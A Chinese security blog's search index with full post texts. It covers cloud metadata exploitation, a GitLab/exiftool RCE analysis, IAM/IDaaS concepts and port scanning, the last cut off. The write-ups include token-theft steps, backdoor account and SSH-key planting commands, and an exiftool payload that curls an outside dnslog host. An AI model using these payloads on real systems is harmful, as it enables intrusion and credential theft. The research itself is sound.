<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[defence-in-depth]]></title>
    <url>%2Fblog%2Fdefence-in-depth%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[ak-exploit]]></title>
    <url>%2Fblog%2Fak-exploit%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[安全大图&趋势]]></title>
    <url>%2Fblog%2Fsecurity-overview%2F</url>
    <content type="text"><![CDATA[此篇用于收集各大机构公开发布的安全领域相关趋势和大图。]]></content>
      <categories>
        <category>overview</category>
      </categories>
      <tags>
        <tag>overview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云平台metadata利用]]></title>
    <url>%2Fblog%2Fcloud-metadata-exploit%2F</url>
    <content type="text"><![CDATA[实例元数据(metadata)是关于实例信息的一组信息合集，用于配置和管理运行中的实例，metadata包含不同类型的数据，包括DNS信息，主机名，region相关信息，VPC信息，网络类型与安全组，账号，RAM角色、系统事件等信息。一般分为一下两大类: 基本实例元数据，包括基本信息与系统事件信息 动态实例元数据，包含动态生成的标识数据，一般用于身份的标识验证 需要注意的是，虽然metadata只能通过在实例本身进行访问获取，但是获取到的数据是不受身份验证或加密保护的。这一点的存在也导致了SSRF漏洞在云平台、甚至云服务上有了新的用处，即获取metadata实例元数据进而利用。 metadata的利用大部分集中在实例具有RAM角色或者存在IAM角色，这时可以通过metadata的接口获取到临时Token，这个临时Token具有该角色的所有权限，如读取存储桶、读取日志、执行指令、甚至创建后门账号、后门实例等等。 下面以Alibaba Cloud和Gppgle Cloud Platform的metadata利用为例。 Alibaba Cloud Metadata Exploit首先是阿里云，在阿里云ECS实例中即可访问100.100.100.200/latest/meta-data，会返回所涉及的基础元数据信息。当然这些数据虽然比较敏感，但其实只是机器的基本信息，并没有什么太大的危害，而当只有该实例被授权了RAM角色时，这时候通过metadata可以获取临时STS token，进而获取该角色的所有权限。 要可以被利用，则首先需要该实例具有RAM角色权限，通过如下方式授权。RAM角色是阿里云的身份管理的一个概念，可以理解为一组权限列表的集合。 这里我们新建一个AliyunTestRole并只授权Logstore的读取权限。之后再在ECS访问时，便会新出现/ram路径，通过/ram/security-credentials/可以获取RoleName，再通过/ram/security-credentials/RoleName即可获得STS Token. 这样我们拿到了临时Token，之后我们在尝试通过这个token来获取logstore日志: 1aliyunlog log get_log --project=xxx --logstore=xxx --from_time=xxx --to_time=xxx --size=1 --sts-token=xxx --region-endpoint=xxx --access-id=xxx --access-key=xxx 可以看到，通过aliyun-cli利用STS Token即可做该角色所有权限的事情。这里再介绍最为常见高危的一种，创建账号并可以登陆控制台。当然，这个要求该角色具备这些权限。 首先通过STS Token的 createUser 创建一个用户，并配置密码，之后授权AdministratorAccess管理员权限， 之后登录便可具有控制台的权限，注意登录名是userName@账号id的形式，账号id可以通过aliyun ram GetAccountAlias获取。 至此利用成功，除了可以创建后门账号登陆外，有了token也有很多其他的利用方式，这里不再赘述，有兴趣可以看我的云上利用常见总结。 Google Cloud Platform Exploit和aliyun类似的思路和步骤,GCP的整体思路和流程也基本一致。谷歌的metadata使用域名的方式进行访问，因此使用metadata.google.internal或直接使用其解析的保留地址IP 169.254.169.254均可。我们首先在VM里面去直接请求下，我们可以看到，直接通过curl请求显示403错误，缺失了Metadata-Flavor:Google header字段。可以看到，这一点google的有着更严格的限制，基本杜绝了通过SSRF漏洞来获取metadata的数据内容，因为正常业务请求时基本不会带上这个字段，这一点确实比阿里云做的好。除此之外，还有以下的限制： 请求需带Metadata-Flavor:Google header 不接受任何包含X-Forwarded-For字段的请求，这些请求一般是转发过来的 我们带上Metadata-Flavor:Googleheader之后，可以正常返回了。 GCP对新建的每个实例会默认附带一个服务账号，这个服务账号有3种可选的访问权限范围，默认、全部及自定义。可以通过metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token获取token并根据metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes获取访问权限范围。这里注意token会返回一堆.....这个忽略去掉就好了，我一开始还以为是脱敏处理拿不到token。拿到token后可以使用google api来进行token验证。 我们来看看默认的策略具有什么权限： 12345678[xxx@empty-xl-gcp ~]$ curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H "Metadata-Flavor: Google"https://www.googleapis.com/auth/devstorage.read_onlyhttps://www.googleapis.com/auth/logging.writehttps://www.googleapis.com/auth/monitoring.writehttps://www.googleapis.com/auth/service.management.readonlyhttps://www.googleapis.com/auth/servicecontrolhttps://www.googleapis.com/auth/trace.append 我们可以看到，其实这里访问范围是对存储桶有读权限的，这里的读是针对项目的所有bucket生效，这一点非常重要。 我们通过API即可获取存储桶，进而获取文件内容。 除了读取数据，我们还可以通过写入元数据SSH密钥的方式获取实例控制权限，前提是具有auth/compute访问范围。首先是获取metadata fingerprint, 1234567891011121314151617181920212223242526272829303132331.获取fingerprintcurl https://compute.googleapis.com/compute/v1/projects/proud-archive-360203 -H "Authorization":"Bearer ya29.c.xxxxx"&#123; "kind": "compute#project", "id": "3341288xxxxx", "creationTimestamp": "", "name": "proud-archive-360203", "commonInstanceMetadata": &#123; "kind": "compute#metadata", "fingerprint": "TkjH3rLXXAw=", "items": [ "key":"ssh-keys", "value":"xxxxxx" ]2. 使用setCommonInstanceMetadata API 设置 ssh元数据 添加一个ssh key进去ssh-keygen -t rsa -b 2048 -C "user@server"curl -X POST -vv https://compute.googleapis.com/compute/v1/projects/proud-archive-360203/setCommonInstanceMetadata -H "Authorization":"Bearer ya29.c.b0AXv0zTOigiF6adb2QoyoYI-DTtENRneyg5jSSEod4MefSZJX_8i6S2tkiAwP6smC5WAfNHv2L5iDfliyFuz_AZqCceDelY599T2CSLe7LV-tTPaBy64k6YfHP8Sudgr9suhLqoc1yZIrJrhKOcDWoTx7HmbmTu1HunG9XbR0kYrPliokQ6m4uQvfhSleVAtnVjU0HlVFihzeVGUJVjp6QVmRgQ" -d @/root/data_metadata.jsonpost_data:&#123; "fingerprint": "d6ZUq4Nc2Qw=", "items": [ &#123; "key": "ssh-keys", "value":"user:ssh-rsa AAAAB3NzaC1xxx user@empty-xl-gcp-123" &#125; ]&#125; 最后即可通过密钥证书直接登录获取服务器权限。]]></content>
      <categories>
        <category>cloud security</category>
      </categories>
      <tags>
        <tag>metadata</tag>
        <tag>cloud security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IAM and IDaaS, 纵深防御的强对抗点]]></title>
    <url>%2Fblog%2Fiam-and-idaas%2F</url>
    <content type="text"><![CDATA[随着外部环境的进一步恶化，攻击勒索事件频发，钓鱼以及鱼叉式攻击已经变得越来越频繁且成本越来越低，甚至已经出现有体系化的钓鱼平台和钓鱼小分队。这一点其实在内部对抗，国家级攻防演练，甚至披露的APT组织中也经常发生。而随着企业组织人员的不断扩充，鱼叉式攻击的风险并没有得到有效收敛，反而风险系数甚至随人员的增长而成比例递增，这一点在任何安全建设中都是无法接受的。除此之外，组织内部的应用为了实现安全管理，所有应用都要去维护认证、鉴权的逻辑，众多冗余且参差不齐的认证鉴权系统，并没有增强身份认证的安全性，反而制约了研发的专注度，因此将身份鉴权认证剥离出来并统一进行管理的思想，构成了IAM(Identity and access management)，他的核心思想是the right individuals to access the right resources at the right times for the right reasons. IAM的引入可以大大降低了企业对于身份管理的成本，最简单的例子是员工的离职无需在各个系统重手动的撤销权限。 疫情的突然爆发，使得越来越多的企业进行远程办公，这种混合办公的模式也对办公安全提出了更大的挑战，同时也激发了大量IAM的需求与机遇。可以从Gartner的2022安全趋势中可以看到，基于身份的攻击防御已经成为了趋势(这个在后面会提到)，而okta也称为了市值TOP的公司。而随着企业上云的步伐逐步加快(客户性质决定了国内更偏向专有云，国外更偏向公有云)，PasS的思想也促使IAM向IDaaS转变(Identity as a Service). IDaaS不仅具有开箱即用，支持云环境的特点，他和IAM最大的区别是IDaaS的目标是构建一个身份认证生态，可以支持各种原有身份体系的接入，这一点对于有大量历史包袱的企业和海外大量多云环境客户来说，非常友好。这里插一句，目前来说多云环境的安全建设和管理也是一个新的方向，但国内这方面需求看起来比较少，反而海外的公司需求会多一些，这可能也是okta可以快速增长的原因之一。 数字身份与多因素认证(Digital Identity &amp; Multi-factor Authentication)对于身份的管理，数字身份与多因素认证是无法绕不开的基础。数字身份是计算机系统或应用用来代表个人、设备、组织的数字化身份信息，系统或应用通过确认身份从而进行相应的数据处理或反馈，例如返回对应的用户页面或者相应数据，又或返回管理页面还是普通用户页面。数字身份主要包含三部分: Authentication(自我认证，我有这个身份) Identification(身份认证，我是什么身份) Authorization(权限确认，我可以访问什么资源) Authentication也是我们熟知的”登陆”操作，历史最悠久的账号+密码组合大家肯定不会陌生，直到现在很多网站还存在这样的认证方式，危害显而易见，全球的各种数据库被脱了无数次。再此之后，出现了账号+token的方式，使用一个可以轮转的token来代替明文密钥。这个方式也是github今年全面推广的安全策略，通过develop access token代替密码进行代码部署与发布，我猜很有可能跟日益严重的供应链攻击有关，大量开发人员的账密被撞库后进行恶意代码的插入，再利用开源项目的广泛关注度以达到入侵全球企业的目的。 除此之外，随着移动设备的普及和不同等级场景的需要，又新出现了一系列认证手法，如上图所示，包含了一系列的验证方式，密保卡、动态密码、短信、扫描、app消息、邮件、指纹、人脸、虹膜、声纹、硬件密钥、U盾等等，而基于用户当前的风险状况采用额外不同的认证方式，也叫做多因素认证MFA，一般情况下，在最初认证是会采用账号+密码+其他的组合进行认证，也叫2FA。在IAM中，这种多因素认证会贯穿整个交互中，当系统认为存在操作风险时，便会根据场景要求新的认证方式以确保当前的操作时符合预期的。 如上图所示，是一个典型的MFA认证流程，整体过程也比较简单，通过多个有效因子综合验证得到合法身份和权限信息。 Identification侧重于身份的类别区分，更强调与现实世界关系的绑定，比如登陆的人是研发、运营还是管理员又或是外包同学。Authorization则侧重于所属身份具有的权限信息，例如是否拥有该系统的访问权限，又或者只有临时的部分目录访问权限等等。 IAMIAM被认为是身份管理的解决方案，其核心功能包含4点，也常被称为4A厂商: 认证(Authentication) 授权(Authorization) 账号(Account) 审计(Audit) 认证和授权的含义在上面已经提到过了，账号指的是针对身份的全流程管理，包括账号创建、权限修改及移除、账号转交、账号销毁等流程。而审计是指整个身份的全生命流程及操作都有响应的记录，便于溯源及安全检测，一旦发现可疑或高危的操作行为，有能力进行二次验证甚至告警，人工干预进行事件响应。这里多说一点，在身份盗用成本和难度比较低的今天，审计功能日志记录对于安全能力的建设至关重要，异常的登陆尝试、授权甚至后门账号的添加修改，都往往是整个企业生产网沦陷的开始。 在传统的身份认证体系当中，当通过认证系统后，会在数据包中加入token字段以代替账密的输入，服务端业务的通信会去校验token值从而正常的访问，由于这个token一般失效时间都非常久，因此攻击者只要从各种途径获取到此token值，便可以窃取真实身份。对于此，一般通过设置两个不同失效时间的token来缓解此类问题，access token与refresh token。如下图，是一个典型的OAuth2的使用流程，OAuth的好处是解耦了认证和授权，可以使第三方服务在不获取到凭据的情况下，得到访问资源的权限。 客户端与授权服务器和资源服务器通讯，客户端首先跟授权服务器进行认证过程，认证成功后授权服务器会返回access token和refresh token，其中access token是客户端与资源方交互的token，失效时间较短，这样攻击者即使获取到也会因为token的失效而攻击失败。refresh token为客户端保有的刷新密钥，当access token失效时，客户端通过refresh token去授权服务器换取新的access token，这样的好处是客户端不用频繁的进行验证操作，且refresh token保有在客户端，在通信中被获取的概率大大降低。 IDaaS相比于IAM，IDaaS(Identity as a Service)最大的优势是可以将多个应用程序的身份整合到一个简化的系统中，且原生支持了云的特性、云服务接入和云原生化部署。举个例子，在过去，IAM产品只支持本地化的部署，而随着业务上云以及组织扩张收购，可能出现多个子公司的IAM系统，其实又变回了以前混乱的状态。而IDaaS作为轻量云化的服务，天生支持基于云的服务接入与易扩展性，可以将多个IAM系统整个到同一套集中化的SSO当中来，这样即使人员企业扩张，也无需很大的修改原有鉴权体系，简单高效的提高了身份认证的水位，也无需担心会随着人员增长风险成比例增加。因此，IDaaS的三个特性显而易见: 单点登录(SSO) 多因素认证(MFA) 身份管理(LDP) 除此之外，由于接入的高效性，IDaaS产品不仅仅适用于办公应用(与人交互的服务)，生产应用间、k8s、API等都可以通过SDK的方式统一高效的获取身份认证安全能力，同时由于审计能力的存在，使得这部分东西向流量访问也被记录下来，用于安全检测和溯源。 Azure Activity Directory接下来，我们通过Azure Active Directory来学习下微软在IAM领域的设计思路和经验。之所以选Azure的，主要因为其处于领导者象限且天生依附于Azure云平台，更有借鉴的意义。 Azure Active Directory (Azure AD) 是一种基于云的身份和访问管理服务。此服务可帮助您的员工访问外部资源，例如 Microsoft 365、Azure 门户和数以千计的其他 SaaS 应用程序。Azure Active Directory 还可以帮助他们访问内部资源，例如您的公司 Intranet 网络上的应用程序，以及为您自己的组织开发的任何云应用程序。 AD架构体系与定位首先是AD的架构，这一点和其他云服务一样，主要包括可用性、主从容灾备份、可扩展性、容错性、数据一致性方面的考虑，并提供了服务的监控与审计，这些不再赘述。如下图，AD采用异地备份的方式，当主副本写入数据时便会立即同步复制至从副本。 由于任何服务都存在性能瓶颈，AD服务也不例外，如果所有的接入方都频繁的进行鉴权验证，同样会打挂AD服务，所以实际生产中AD的逃逸和稳定性也是需要考量的重要指标之一，如下图为Azure推荐的降低请求量的方式，其实从这个图可以体现微软对于AD的定位，统一的身份管理服务，用于接入各种不同的生态体系方并提供了MFA进行认证。 基于零信任的身份验证策略Azure AD基于零信任的思想，设计了一套身份认证策略，即什么时候需要MFA挑战，什么时候不需要。这一点也是安全性和用户体验平衡的矛盾点。对于AD的身份认证，核心点有4个: 使用身份去访问资源(任何凭据都有可能泄露，账密、AK、私钥) 使用统一的身份认证管理体系，保持云上身份与已有身份系统的一致性(确保安全水位一致性) 使用无密码或现代密码方式(减少明文密码、弱口令，采用MFA、证书、OAuth等认证策略) 启用条件身份验证策略(根据操作和风险进行MFA挑战) 下图是AD身份验证及限制示意图，其利用策略与机器学习模型，实时分析用户和设备的位置信息及行为数据，针对可能存在的用户或会话风险进行不同的响应，包括放行阻断、访问限制、MFA验证、重置、拦截。除此之外，其集成了与其他安全产品的联动，例如与Microsoft Defender for Endpoint的威胁联动，及时进行身份异常行为的检测与阻止。当然，所有的身份验证都存留有审计日志，可以在SIEM中进行查看与分析。 单点SSO单点登录SSO(single sign-on)是指使用一组凭证登录多个不同的独立系统。由于AD是一个统一的身份认证平台，代替和整合原有各个认证系统形成统一的认证鉴权接口就显得很有必要，通过这样的单点SSO验证身份登陆后，在有权限的各个系统的访问均不再需要提供身份认证对于用户来说也是一个极大的便利。 不同的系统可以选择不同的SSO登录方式，例如云应用可以使用联邦身份认证，例如OpenID Connect、OAuth、SAML,又或者其他应用使用密码或基于链接的SSO。 下面介绍下OIDC(OpenID Connect),他已经成为了行业单点登录和身份管理的通用标准。它基于OAuth2的基础上，又新增了一个身份层。OIDC允许客户端基于授权服务器或身份提供商(ldP)来进行身份的验证和授权，采用RESTful API并通过JSON格式进行数据传递。 如图所示，基本的逻辑和OAuth类似，增加了id_token来表述身份的概念。具体的id_token字段详见id_token字段详解 反向代理与多应用集成AD反向代理可以使用户通过AD来对本地应用程序进行代理，从而将本地应用接入到整个体系当中，并可以通过互联网进行访问。 除了反向代理之外，AD也支持大量的SaaS化服务，这些服务支持的多少也是IDaaS生态的核心竞争力之一，便于系统轻松的接入各个生态。 角色访问策略和其他所有云的访问控制类似，都是基于角色来精细化配置可访问的资源类型和内容。角色可以理解为权限的集合，一般会对应于达成某个目的最小权限集合，当然这里大多数的配置都会与现实中身份或者生产应用有关。 安全报警、身份保护与审计这里体现了AD的审计功能，包括各类登陆日志的异常告警，特定活动的展示信息，以及和其他安全产品的联动审计识别，除此之外，AD还具有身份保护功能。当AD识别到当前该身份的使用存在风险时，会针对该身份进行封禁以保护企业的安全。 回到最开始的话题，随着上云以及云原生化的普及，传统的账密泄露风险已经慢慢转变为身份凭据泄露的风险，例如AK，证书的泄露。而随着企业组织人员的不断庞大以及漏洞管理的重视情况有所好转，在身份管理与访问控制上，必定是一个需要发力的正向建设点，也会是攻防双方对抗的火力点。]]></content>
      <categories>
        <category>IAM</category>
      </categories>
      <tags>
        <tag>IAM</tag>
        <tag>IDaaS</tag>
        <tag>zero trust</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[traffic-hiding-via-cdn]]></title>
    <url>%2Fblog%2Ftraffic-hiding-via-cdn%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[socks-protocol-analysis]]></title>
    <url>%2Fblog%2Fsocks-protocol-analysis%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[spoof-defense]]></title>
    <url>%2Fblog%2Fspoof-defense%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[zero-trust]]></title>
    <url>%2Fblog%2Fzero-trust%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike-analysis]]></title>
    <url>%2Fblog%2Fcobaltstrike-analysis%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[metasploit-analysis]]></title>
    <url>%2Fblog%2Fmetasploit-analysis%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[intrusion-respone]]></title>
    <url>%2Fblog%2Fintrusion-respone%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[att&ck-matrix]]></title>
    <url>%2Fblog%2Fatt-ck-matrix%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[container-security]]></title>
    <url>%2Fblog%2Fcontainer-security%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[hids_summary]]></title>
    <url>%2Fblog%2Fhids-summary%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[加密流量检测的一些思路]]></title>
    <url>%2Fblog%2Fencrypted-traffic-analysis%2F</url>
    <content type="text"></content>
      <categories>
        <category>traffic analysis</category>
      </categories>
      <tags>
        <tag>加密流量</tag>
        <tag>流量指纹</tag>
        <tag>traffic analysis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gitlab 13.10.2 Remote Code Execution漏洞分析(CVE-2021-22204、CVE-2021-22205)]]></title>
    <url>%2Fblog%2Fgitlab-exiftool-djvu-rce%2F</url>
    <content type="text"><![CDATA[这个漏洞其实影响也挺广的，虽然是需要授权，但其实在公网上暴露的很多gitlab都是开放注册的，其实也基本等于给了授权。除此之外，获取CSRF_TOKEN后也可以触发。这个漏洞本质不是gitlab的代码问题，而是gitlab在文件处理时的逻辑，引用了第三方exiftool组件导致在解析时出现问题，从而引起的任意文件执行。 总结一下: gitab中的gitlab-horse会根据上传文件的标识符来判断文件类型，不同类型有着不同的处理逻辑，对于图片类的文件，会去调用exiftool组件来清除图片文件的元数据，而exiftool组件在处理Djvu格式文件的时候，存在缺陷，可以透过构造恶意的元数据造成双引号逃逸，从而执行任意指令。 gitlab 数据传递逻辑首先我们去下载个受影响版本的gitlab，https://github.com/gitlabhq/gitlabhq/tree/v13.10.2。官网对于gitlab-workhorse的描述可以见下图所示。可以看到，最前端nginx会将请求代理给gitlab-workhorse，按官方的说法，gitlab-workhorse用于处理负载量较大的HTTP请求，例如文件的上传下载、git操作等。 在gitlab-workhorse的文档中描述了，其安装时依赖ExifTool，用于擦除元数据。 我们来看一下程序里面实现的逻辑。首先会去判断上传的文件类型，如果是exif文件的话，会去调用handleExifUpload函数进行元数据清理。handleExifUpload中会去调用NewCleaner--&gt;cleaner，最终执行exiftool指令进行数据清除。 在清理之前，会去判断元数据的tag是否存在，清除掉敏感元数据保留允许的tags。可以看到最终通过exif_tags方法触发了exiftool对于文件元数据tag的解析，从而造成漏洞利用。 exiftool漏洞详情上面我们介绍了gitlab-workhorse的处理逻辑，接下来我们来看exiftool部分的逻辑。ExifTool是由Phil Harvey开发的一个跨平台元数据处理软件，由perl语言编写而成，支持大量的不同格式的数据，包括图像、音频、视频、pdf等等，详见exiftool官网。这个漏洞是利用的exiftool低版本的一个RCE漏洞，而在gitlab-workhorse中的操作指南提到，推荐使用apt install libimage-exiftool-perl进行安装，而默认源中的版本较低，存在漏洞。 exiftool简介exiftool的整体逻辑还是比较清晰的。如下图，为其代码的整体结构图，因为是perl语言编写的，看起来还是比较容易的。入口文件为exiftool，lib文件夹中存放了处理不同文件格式对应的逻辑代码，以文件类型名+.pm为结尾。t文件夹中是各种文件类型的样例，方便将其作为基础进行使用。 123456789101112[常见使用方法]# 查看文件所有元数据 exiftool example.jpg# 插入元数据值到文件exiftool -key=value example.png# 清除某个tagexiftool -key= example.png# 清除所有tagexiftool -all= example.png exiftool DjVu RCE利用这个漏洞在DjVu格式文件的处理逻辑中。我们首先来了解下DjVu是什么。djvu在过去主要用于存储扫描的文档，如电子书等，其相对于PDF并不普及，其对二进制图像有损压缩，从而以较小的控件存放高质量的可读图像。可以找一个例子看下，使用exiftool xxxx.djvu来查看解析djvu元数据。好像并看不出来什么，都是格式化后的kv形式。我们来看DjVu.pm文件。可以看到函数ProcessAnt用于检查判断是否存在注释性语句，/\(\s*(metadata|xmp)[\s(&quot;]/ 其格式应该是匹配这样的正则表达式。ParseAnt是一个递归调用的函数，用于从(xxx)的注释性数据中，解析出kv的内容。 为了验证我们的猜想，我们将$dataPt输出出来，如下图，可以看到metdata如我们分析的一样，是以(kv kv)的形式存储的。其中value的值用&quot;双引号包裹。 知道格式了，我们来说下这个漏洞。很明显，罪恶之源eval又出现了。在上面的代码中，会通过$来匹配文件末尾，但如果字符串是多行字符串时，只会匹配到第一行末尾，而重新构造一个新行和新引号时，会将第二个引号进行毕业从而逃逸出来，第二个引号后的内容便可以直接被执行。qq的意思是将其作为双引号字符串来输出。 因此，当我们可以构造一个带有恶意元数据的DjVu文件时，将其用exiftool解析即可触发漏洞。为了构造DjVu格式，我们可以根据官方提供的DjVu文档来进行修改构造，文档见djvu_document。大致简单介绍下，DjVu主要是用于存储电子书，所以其存储的内容基于和我们现在看到的pdf类似。其由单页或多页组成，并可以保存注释信息、隐藏文字信息以及缩略图。不同的层/块(chink)用于保存不同的信息，例如DIRM块存储目录信息，ANTz块存储注释信息。FORM块表示是一个合成块，包含有多个其他的块。 不同类型的文档有着不同的块，比如单页文档在一个FORM:DJVU块中，而多页文档用FORM:DJVM标识，且其内部的第一个块是文档块DIRM。注释信息在ANTa或者ANTz块中，原文信息在TXTa或者TXTz块当中，其余的不做过多介绍，可以参考文档查询。 可以看到，前4字节是magic标识，用于标识是djvu文件。之后就是chunk_data,每个chunk_data由3部分组成，chunk_id,length以及具体的data。 那么现在我们根据已知的信息来构造恶意文件，我们知道构造的payload在metadata中，也就是注释块中，我们使用明文ANTa块更便于我们生成payload，但要注意ANTz也是可以的，其结果是使用BZZ encoder进行压缩后的内容。我们首先根据t/image/DjVu.djvu来进行修改，修改一个正常的内容。 12345678910111213141516&gt; xxd DjVu_base.djvu [ec6d7de]00000000: 4154 2654 464f 524d 0000 00d5 444a 564d AT&amp;TFORM....DJVM00000010: 4449 524d 0000 002f 8100 0200 0000 4800 DIRM.../......H.00000020: 0000 aeff ffde bf99 2021 c895 c8df 7074 ........ !....pt00000030: fa80 cdde 63c5 ed3c ee1f a274 9fe8 f530 ....c..&lt;...t...000000040: 5ef8 baae 15f4 9c00 464f 524d 0000 005e ^.......FORM...^00000050: 444a 5655 494e 464f 0000 000a 0008 0008 DJVUINFO........00000060: 1800 6400 1600 494e 434c 0000 000f 7368 ..d...INCL....sh00000070: 6172 6564 5f61 6e6e 6f2e 6966 6600 4247 ared_anno.iff.BG00000080: 3434 0000 0011 004a 0102 0008 0008 8ae6 44.....J........00000090: e1b1 37d9 7f2a 8900 4247 3434 0000 0004 ..7..*..BG44....000000a0: 010f f99f 4247 3434 0000 0002 020a 464f ....BG44......FO000000b0: 524d 0000 02ec 444a 5649 414e 5461 0000 RM....DJVIANTa..000000c0: 001f 286d 6574 6164 6174 610a 0928 4175 ..(metadata..(Au000000d0: 7468 6f72 2022 656d 7074 795f 786c 2229 thor "empty_xl")000000e0: 29 ) 看来我们理解的没错，接下来我们试着去插入恶意payload，可以看到已经执行了指令。 其他模块解析#AIFF之前提到的漏洞点在DjVu模块的处理逻辑中，一些复杂的文件格式一般都会支持内置各种其他的文件格式，那么是否有其他模块调用了该模块的解析函数？我们对整个目录进行搜索，可以看到了AIFF模块中调用了DjVu模块。而AIFF解析数据时会去判断数据格式是否为DjVu，如果是解析对应的数据。因此在AIFF中插入DjVu数据再去解析也可以触发漏洞。 #Extractinfo除了直接在代码中写了去调用DjVu模块，在exiftool.pm中有Extractinfo函数，其会根据不同的magicNumber头去判断文件所属类型，从而调用不同的$module.pm来进行解析。因此，如果我们上传的文件能够触发Extractinfo函数并通过构造AT&amp;T头让其解析为DjVu格式进而调用DjVu.pm的处理函数，造成漏洞利用。 因此我们的目标就是搜索其他什么类型的文件处理逻辑中调用了Extractinfo来解析内容，且解析的方式应该是递归式的根据文件每个块的类型进行解析。根据搜索结果，应该有9个类型解析时会触发调用Extractinfo字段，包括Cannon/CaptureOne/Exif/MPF/PDF/PGF/Rawzor/Samsung/ZIP 我们点进去看，每个处理逻辑其实是需要一定的触发条件的，利用exif类型需要使用特定的TAG，PDF需要使用特定的filter等等。 #Exif这里我们看下Exif.pm的处理逻辑，其是用于Read EXIF/TIFF meta information。EXIF格式我不太熟悉，而TIFF我们知道是一个位图格式，应该跟我们以前的文章image文件格式解析分析jpg、png时差不多。这里TIFF格式解析参考这篇文章TIFF 文件格式以及样例t/image/exiftool.tif基本可以弄的差不多。因此，如果我们构造一个0xc51b的块，然后将其数据填充为带恶意payload的Djvu内容就可以触发利用。 比较方便的是，exiftool有一个自定义配置并按照配置生成文件的功能，非常有用。我们随便从网上下载一个tiff文件作为base，然后将我们构造的恶意数据插入进去。 123456789101112131415161718%Image::ExifTool::UserDefined = ( 'Image::ExifTool::Exif::Main' =&gt; &#123; 0xc51b =&gt; &#123; Name =&gt; 'cons_exif', Binary =&gt; 1, Writable =&gt; 'undef', WriteGroup =&gt; 'IFD0', ValueConvInv =&gt; sub &#123; my $meta = qq/(metadata\x0A\x09(Author "\\\x0A" .qx&#123;curl 1zritd.dnslog.cn&#125; ;#")\x0A)/; my $len = qq/\x00\x00\x00\x39/; my $payload = qq/AT&amp;TFORM\x00\x00\x00\x45DJVUANTa$len$meta/; return $payload; &#125; &#125; &#125;)../exiftool -config cons_exif.configtiff_base.tif -cons_exif='empty_xl' 其他文件格式的触发方式也类似，在此不再赘述，基本方法就是分析一下文件格式，然后按特定的方式插入payload构造恶意文件，最终触发漏洞。 Gitlab POC分析完了原理，我们来实际进行验证一下在gitlab中的利用。如我们之前分析的，gitlab只会将jpg/jpeg/tiff后缀的文件传入exiftool进行tag清理，那么按我们的理解，我们只要任意找到一个上传点，上传的文件后缀改成jpg/jpeg/tiff3者之一就可以触发。值得注意的是，尽管这个漏洞需要后台权限，但是很多对公网开放的gitlab网站都支持注册机制，因此鉴权的逻辑基本等于没有。 我们来试一下，我们随便开一个new issue然后进行上传，可以看到已经利用成功。 当我们对原有图片进行修改时，会调用PUT方法，可以看到也可以成功。 当然，tiff类型的文件上传，依旧可以触发成功。]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>Remote Code Execution</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[空间搜索引擎与端口扫描欺骗]]></title>
    <url>%2Fblog%2Fsome-analysis-of-the-Internet-spatial-search-engine%2F</url>
    <content type="text"><![CDATA[在整个ATT&amp;CK的链路中，资产扫描探测的结果对于最终的渗透效果有着重要的影响，对目标资产了解的越多，更容易分析出组织架构、脆弱点和突破点。为了减少扫描行为被防守队发现或封禁，Shodan, Fofa, Zoomeye等空间搜索引擎作为第三方的资产收录平台可以很好的辅助我们，免去扫描的步骤，直接搜索利用点。尤其是在攻防演练或者hw等时期，大量的蜜罐部署以及7*24小时的防守值班，任何轻微的可疑扫描行为都会引起防守队的察觉，从而被封IP。因此利用好第三方搜索引擎的结果，可以让我们更加容易和灵活的进行边界突破。本文将介绍空间搜索引擎的原理及一些常见特性，以及可能的对抗方式——扫描欺骗。 首先第一个问题，这些搜索引擎的作用是什么？根据个人经验，我将其划分为以下4类。 资产发现与统计 基于版本、banner的漏洞利用 脆弱性信息发现 (包括弱口令、回显包含hacked by xx) 0day漏洞影响评估 在本篇文章中，我们主要关注与原理层面的内容并尝试通过各种方式验证我们的猜测。除此之外，一些常用的用法及特性放在了附录中，可以作为清单进行查询。 端口扫描首先是第一阶段，端口扫描。大多数搜索引擎都会声称他们的产品扫描全网整个IPv4的地址空间并进行识别收录，根据我的实际测试结果，在公网服务器上部署任意一个服务，基本上这些引擎的数据库都会在1天之内进行收录，效率还是蛮高的。那么，他们是如果对整个IPv4空间进行扫描的？根据一些公开的分享和业界对于端口扫描的常见方式，基于无状态扫描的高效性，基本可以确定这些搜索引擎也是使用类似zmap,masscan这样的工具进行端口开放性探测，之后在第一步的基础上，利用nmap等工具进行服务的版本探测、指纹识别。 对于TCP的服务扫描，其原理基本分为两大类: 基于TCP三次握手机制 基于RFC规定实现的特性 使用第一类方式进行扫描是基于握手机制，客户端发送SYN包，服务端返回SYN+ACK包进行确认，常见的有SYN扫描(半连接扫描)、connect扫描、无状态扫描；第二类大多数是基于TFC的规定(当数据包中没有SYN/ACK/RST标志时，端口关闭的会导致服务器返回一个RST包，而被过滤或开放不会有任何回包)，例如常见的TCP window/ACK扫描，TCP Xmas/FIN/null/Maimon 扫描。第二类的扫描机制无法有效确认出端口是否开放，所以在全网量级的扫描活动中并不常见，大部分还是基于第一类的三次握手原理进行。 Zmap and masscan are well-known port scanning tools, which claim to scan the entire network ports within 45 minutes. The reason why the speed is 